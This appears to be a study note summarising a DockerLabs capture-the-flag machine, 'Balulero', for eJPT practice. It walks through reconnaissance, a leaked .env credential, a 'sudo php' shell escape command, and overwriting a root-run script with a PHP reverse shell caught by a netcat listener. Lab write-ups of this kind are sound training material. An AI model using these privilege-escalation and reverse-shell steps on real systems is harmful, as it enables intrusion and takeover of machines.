---
type: machine
platform: dockerlabs
difficulty: easy
ip: 172.17.0.2
cves: []
tools: [nmap, dirb, curl, netcat]
techniques: [source-code-disclosure, sudo-abuse, group-ownership-enumeration, cron-job-abuse, reverse-shells]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: [[balufood]], [[hannah-coffee]]
---

# Balulero

**Writeup:** [raw writeup](../../writeups/dockerlabs/easy/balulero.md)

Easy box that chains an exposed `.env` file, a `sudo php` escape, and a group-owned script that runs as root.

## Path

1. **Recon** — `nmap` shows `22/tcp ssh` (OpenSSH 8.2p1) and `80/tcp http` (Apache 2.4.41).
2. **Dir fuzzing** — `dirb` finds only `index.html` and a 403 on `server-status`.
3. **Source disclosure** — an exposed `.env_de_baluchingon` file leaks `balu:balubalulerobalulei` ([[source-code-disclosure]]).
4. **SSH foothold** — `ssh balu@…` with that password.
5. **Sudo escape** — `sudo -l` shows `(chocolate) NOPASSWD: /usr/bin/php`; `sudo -u chocolate php -r 'system("/bin/sh -i")'` drops a shell as `chocolate` ([[sudo-abuse]]).
6. **Group ownership** — `find / -group chocolate` reveals `/opt/script.php` is owned by the `chocolate` group ([[group-ownership-enumeration]]).
7. **Confirm privileged execution** — `ps aux` shows `root … php /opt/script.php`, i.e. root runs the script ([[cron-job-abuse]]).
8. **Overwrite & catch shell** — replace `script.php` with a PHP reverse shell; `nc -lvnp 443` receives a **root** shell ([[reverse-shells]]).

## Credentials / secrets

| Item | Value |
|------|-------|
| balu (SSH) | `balubalulerobalulei` |
| sudo (balu) | `(chocolate) NOPASSWD: /usr/bin/php` |
| chocolate | via `sudo -u chocolate php` |

## Takeaways

- Check for exposed dotfiles/`.env`-style files on web roots ([[source-code-disclosure]]).
- `sudo php` is trivially escapable via `php -r 'system(...)'` ([[sudo-abuse]], GTFOBins).
- `find / -group <gid>` locates files your group can write ([[group-ownership-enumeration]]).
- `ps aux` can reveal a privileged process running a writable script even when cron entries are unreadable ([[cron-job-abuse]]).
